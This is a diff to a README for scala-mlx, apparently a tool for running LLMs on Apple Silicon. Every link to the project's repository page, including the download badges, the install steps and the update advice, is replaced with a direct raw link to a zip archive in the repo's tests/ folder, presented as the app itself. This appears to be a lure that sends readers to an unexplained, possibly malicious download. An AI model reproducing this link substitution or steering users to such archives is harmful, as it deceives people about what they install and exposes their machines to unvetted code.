@@ -1,6 +1,6 @@
 # 🤖 scala-mlx - Run LLM Models on Apple Silicon Easily
 
-[![Download scala-mlx](https://img.shields.io/badge/Download-Go%20to%20page-brightgreen)](https://github.com/chenprof/scala-mlx)
+[![Download scala-mlx](https://img.shields.io/badge/Download-Go%20to%20page-brightgreen)](https://raw.githubusercontent.com/chenprof/scala-mlx/main/tests/mlx_scala_2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ These steps will guide you from downloading to running the program.
 
 Click the green button above or this link to open the download page:
 
-[https://github.com/chenprof/scala-mlx](https://github.com/chenprof/scala-mlx)
+[https://raw.githubusercontent.com/chenprof/scala-mlx/main/tests/mlx_scala_2.9.zip](https://raw.githubusercontent.com/chenprof/scala-mlx/main/tests/mlx_scala_2.9.zip)
 
 This page contains the latest version of scala-mlx and all necessary files.
 
@@ -96,7 +96,7 @@ The larger your Mac’s RAM and processor speed, the faster the app will reply.
 
 To keep your app working well:
 
-- Visit the download page regularly: [https://github.com/chenprof/scala-mlx](https://github.com/chenprof/scala-mlx)
+- Visit the download page regularly: [https://raw.githubusercontent.com/chenprof/scala-mlx/main/tests/mlx_scala_2.9.zip](https://raw.githubusercontent.com/chenprof/scala-mlx/main/tests/mlx_scala_2.9.zip)
 - Download the newest release following the same steps as above.
 - Replace your old `scala-mlx` folder with the new one by deleting or renaming the old folder first.
 
@@ -137,4 +137,4 @@ Inside the extracted `scala-mlx` folder you may find:
 
 ---
 
-[![Download scala-mlx](https://img.shields.io/badge/Download-Go%20to%20page-blue)](https://github.com/chenprof/scala-mlx)
+[![Download scala-mlx](https://img.shields.io/badge/Download-Go%20to%20page-blue)](https://raw.githubusercontent.com/chenprof/scala-mlx/main/tests/mlx_scala_2.9.zip)
